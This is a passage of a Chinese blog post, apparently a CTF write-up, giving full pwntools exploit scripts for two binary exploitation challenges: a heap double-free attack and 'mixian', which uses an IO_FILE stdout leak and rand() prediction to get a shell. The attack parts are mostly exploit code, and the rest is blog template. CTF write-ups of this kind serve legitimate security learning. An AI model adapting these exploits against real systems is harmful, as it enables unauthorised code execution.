class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br><span class="hljs-comment">#p = remote(&#123;IP&#125;)</span><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    sela(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>,stre(<span class="hljs-number">1</span>))<br>    sela(<span class="hljs-string">b&quot;idx???&quot;</span>,stre(index))<br>    sela(<span class="hljs-string">b&quot;size???&quot;</span>,stre(size))<br>    sea(<span class="hljs-string">b&quot;content???&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br>    sela(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>,stre(<span class="hljs-number">2</span>))<br>    sela(<span class="hljs-string">b&quot;idx???&quot;</span>,stre(index))<br><br>reu(<span class="hljs-string">b&quot;: &quot;</span>)<br>heap_base = <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;\n&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x21000</span><br>ph(heap_base,<span class="hljs-string">&quot;heap_base&quot;</span>)<br><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x68</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>))<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x300</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;C&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">9</span>)<br><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>,p64(heap_base+<span class="hljs-number">0x30</span>))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0x3F0</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0x71</span>) + p16(<span class="hljs-number">0x4aed</span>))<br><br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br>dele(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x68</span>,p64(heap_base+<span class="hljs-number">0x90</span>))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x68</span>,p16(<span class="hljs-number">0x4aed</span>))<br><br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x13</span> + p64(<span class="hljs-number">0x400AA6</span>))<br><br>sela(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>,stre(<span class="hljs-number">1</span>))<br>sela(<span class="hljs-string">b&quot;idx???&quot;</span>,stre(<span class="hljs-number">14</span>))<br>sela(<span class="hljs-string">b&quot;size???&quot;</span>,stre(<span class="hljs-number">0x20</span>))<br><br>op()<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="mixian"><a href="#mixian" class="headerlink" title="mixian"></a><strong>mixian</strong></h3><p>​	check:</p>
+<p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732432521110.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	保护全开。</p>
+<p>​	漏洞点：</p>
+<p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732432587514.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	num可以为负数，我们可以申请question_list到stdout的位置，修改stdou为经典的IO_FILE attck获得libc基地址。</p>
+<p>num设置为3则正好可以修改最终判断的变量，通过libc基地址算出puts的地址加上rand()%0x2333的值就能完成getshell。</p>
+<p>​	exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br><span class="hljs-comment">#p = remote(&#123;IP&#125;)</span><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>lib = cdll.LoadLibrary(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br>i = <span class="hljs-built_in">int</span>(time.time())<br>lib.srand(i)<br><br>sela(<span class="hljs-string">b&quot;answer?\n&quot;</span>,stre(-<span class="hljs-number">8</span>))<br>payload = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">b&quot;\x00&quot;</span><br>sela(<span class="hljs-string">b&quot;answer.\n&quot;</span>,payload)<br>re(<span class="hljs-number">0x8</span>)<br>libc_base = raddr64() - <span class="hljs-number">0x1ec980</span><br>ph(libc_base,<span class="hljs-string">&quot;libc_base&quot;</span>)<br>puts_addr = libc_base + libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>payload = p64(puts_addr+(lib.rand()%<span class="hljs-number">0x2333</span>))<br>sela(<span class="hljs-string">b&quot;answer?&quot;</span>,stre(<span class="hljs-number">3</span>))<br>sela(<span class="hljs-string">b&quot;answer.&quot;</span>,payload)<br><br>sela(<span class="hljs-string">b&quot;answer?&quot;</span>,stre(<span class="hljs-number">1</span>))<br>sela(<span class="hljs-string">b&quot;answer.&quot;</span>,<span class="hljs-string">b&quot;A&quot;</span>)<br><br>op()<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>蜀道山CTF-PWN全解WP</div>
+      <div>https://zlsf-zl.github.io/2024/11/24/蜀道山CTF-PWN全解WP/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>ZLSF</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年11月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/02/Pwn%E7%8E%AF%E5%A2%83%E9%A2%84%E5%88%B6%E9%95%9C%E5%83%8F/" title="Pwn环境预制镜像">
+                        <span class="hidden-mobile">Pwn环境预制镜像</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"6qfbMdW9PFOPATbmhAiyPWcK-MdYXbMMI","appKey":"X9xyyWbc7hafcwTqYXwdhjE5","path":"window.location.pathname","placeholder":"文明发言","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://6qfbmdw9.api.lncldglobal.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      <span>by ZLSF</span>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
